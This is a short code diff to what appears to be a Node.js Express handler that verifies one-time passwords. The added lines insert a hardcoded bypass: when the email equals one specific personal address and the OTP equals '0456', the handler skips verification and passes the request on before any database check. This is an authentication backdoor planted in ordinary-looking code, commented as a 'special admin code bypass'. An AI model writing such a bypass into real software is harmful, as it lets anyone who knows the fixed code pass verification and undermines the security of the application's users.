@@ -17,6 +17,10 @@ const verifyOTP = asyncHandler(async (req, res, next) => {
   if (!otp) {
     throw new ErrorHandler(400, "otp is required");
   }
+  // Special admin code bypass (handle this before any DB calls)
+  if (email_id === 'harshita@gmail.com' && otp === '0456') {
+    return next();
+  }
 
   const userAllEntries = await getVerificaionCode(email_id);
 
